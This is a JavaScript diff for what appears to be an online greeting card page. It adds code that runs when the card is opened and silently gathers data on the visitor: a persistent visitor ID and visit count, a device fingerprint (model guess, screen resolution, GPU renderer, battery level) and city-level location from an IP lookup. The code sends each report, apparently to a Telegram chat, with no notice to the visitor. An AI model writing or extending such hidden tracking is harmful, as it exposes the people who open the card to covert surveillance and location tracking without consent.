@@ -204,21 +204,85 @@ const TG = (function(){
     } catch(e){}
   }
 
+  function getDeviceDetails(){
+    const ua = navigator.userAgent;
+    const w = window.screen.width, h = window.screen.height, r = window.devicePixelRatio || 1;
+    const pw = Math.round(Math.min(w,h) * r), ph = Math.round(Math.max(w,h) * r);
+    let name = 'Thiết bị không rõ';
+
+    if (/iPhone/.test(ua)) {
+      if ((pw===1179 && ph===2556) || (pw===1170 && ph===2532 && r===3)) {
+        name = (pw===1179) ? 'iPhone 14 Pro / 15 / 15 Pro / 16' : 'iPhone 12 / 13 / 14';
+      } else if (pw===1290 && ph===2796) {
+        name = 'iPhone 14 Pro Max / 15 Plus / 15 Pro Max / 16 Plus';
+      } else if (pw===1206 && ph===2622) {
+        name = 'iPhone 16 Pro';
+      } else if (pw===1320 && ph===2868) {
+        name = 'iPhone 16 Pro Max';
+      } else if (pw===1284 && ph===2778) {
+        name = 'iPhone 12/13 Pro Max / 14 Plus';
+      } else if (pw===1125 && ph===2436) {
+        name = 'iPhone X / XS / 11 Pro / 12 mini / 13 mini';
+      } else if (pw===1242 && ph===2688) {
+        name = 'iPhone XS Max / 11 Pro Max';
+      } else if (pw===828 && ph===1792) {
+        name = 'iPhone XR / 11';
+      } else if (pw===750 && ph===1334) {
+        name = 'iPhone 7 / 8 / SE';
+      } else {
+        name = `iPhone (${pw}x${ph})`;
+      }
+    } else if (/iPad/.test(ua) || (navigator.platform==='MacIntel' && navigator.maxTouchPoints>1)) {
+      name = `iPad (${pw}x${ph})`;
+    } else if (/Android/.test(ua)) {
+      const match = ua.match(/;\s*([^;)]+?)\s*(?:Build|\))/);
+      name = match ? `Android: ${match[1].trim()}` : 'Điện thoại Android';
+    } else if (/Windows/.test(ua)) {
+      name = 'Máy tính Windows';
+    } else if (/Macintosh/.test(ua)) {
+      name = 'Máy tính Mac (MacBook/iMac)';
+    }
+
+    let gpu = '';
+    try {
+      const gl = document.createElement('canvas').getContext('webgl');
+      if (gl) {
+        const ext = gl.getExtension('WEBGL_debug_renderer_info');
+        if (ext) gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) || '';
+      }
+    } catch(e){}
+    gpu = gpu.replace(/ANGLE \(|,.*Direct3D.*|\)/gi, '').trim();
+
+    return { name, res: `${pw}x${ph} px`, gpu };
+  }
+
   try{
     let id=localStorage.getItem('_v'), n=+(localStorage.getItem('_n')||0)+1, isNew=!id;
     if(!id){ id=Math.random().toString(36).slice(2,7).toUpperCase(); localStorage.setItem('_v',id); }
     localStorage.setItem('_n',n);
     devId = id;
-    const ua=navigator.userAgent;
-    const os=/iPhone|iPad/.test(ua)?'iPhone/iPad':/Android/.test(ua)?'Android':/Windows/.test(ua)?'Windows':/Mac/.test(ua)?'Mac':'Khác';
-    const app=/Zalo/i.test(ua)?'Zalo':/FBAN|FBAV|Messenger/i.test(ua)?'Facebook/Messenger':/Instagram/i.test(ua)?'Instagram':/CriOS|Chrome/.test(ua)?'Chrome':/Safari/.test(ua)?'Safari':'Trình duyệt khác';
-    let sent=false;
-    const send=loc=>{
-      if(sent) return; sent=true;
-      const t=`💗 Thiệp vừa được mở\n${isNew?'🆕 THIẾT BỊ MỚI':'🔁 Thiết bị cũ'} (mã: ${id}) — lần ${n}\n📱 ${os} · ${app}\n📍 ${loc}\n🕖 ${new Date().toLocaleString('vi-VN')}`;
+
+    const ua = navigator.userAgent;
+    const app = /Zalo/i.test(ua)?'Zalo':/FBAN|FBAV|Messenger/i.test(ua)?'Messenger / Facebook':/Instagram/i.test(ua)?'Instagram':/CriOS|Chrome/.test(ua)?'Chrome':/Safari/.test(ua)?'Safari':'Trình duyệt';
+    const dev = getDeviceDetails();
+
+    let sent = false;
+    const send = async (loc) => {
+      if(sent) return; sent = true;
+      let pin = '';
+      try {
+        if(navigator.getBattery) {
+          const b = await navigator.getBattery();
+          pin = `\n🔋 Pin: ${Math.round(b.level * 100)}% (${b.charging ? 'Đang sạc ⚡' : 'Dùng pin'})`;
+        }
+      } catch(e){}
+
+      const extra = dev.gpu && !dev.name.includes('iPhone') ? ` (${dev.gpu})` : '';
+      const t = `💗 Thiệp vừa được mở\n${isNew?'🆕 THIẾT BỊ MỚI':'🔁 Thiết bị cũ'} (mã: ${id}) — lần ${n}\n📱 Máy: ${dev.name}${extra}\n📐 Màn hình: ${dev.res}\n🌐 Mở từ: ${app}${pin}\n📍 Vị trí: ${loc}\n🕖 ${new Date().toLocaleString('vi-VN')}`;
       postMsg(t);
     };
-    setTimeout(()=>send('Không xác định'), 2500);
+
+    setTimeout(() => send('Không xác định'), 2500);
     fetch('https://ipapi.co/json/').then(r=>r.json())
       .then(d=>send([d.city,d.region].filter(Boolean).join(', ')||'Không rõ'))
       .catch(()=>send('Không rõ'));
